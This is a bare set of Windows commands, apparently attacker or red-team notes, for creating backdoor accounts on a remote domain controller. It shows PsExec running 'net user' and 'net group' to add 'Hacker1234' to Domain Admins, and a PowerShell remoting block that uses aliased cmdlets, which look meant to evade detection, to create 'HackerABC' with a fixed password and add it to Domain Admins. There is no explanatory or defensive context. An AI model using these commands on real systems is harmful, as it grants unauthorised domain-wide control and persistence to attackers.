#psexec on remote DC
psexec.exe -accepteula \\dc net user /add Hacker1234 P@ssw0rd
psexec.exe -accepteula \\dc net group "Domain Admins" Hacker1234 /add /domain

#powershell remoting
icm -comp dc -scr {
    New-Alias -Name nadu -Value New-ADUser;New-Alias -Name aadgu -Value Add-ADGroupMember;New-Alias c2ss ConvertTo-SecureString
    nadu HackerABC -AccountP (c2ss -String 'P@ssw0rd' -AsPlainText -Force) -PasswordNe $true
    aadgu "Domain Admins" "HackerABC"
}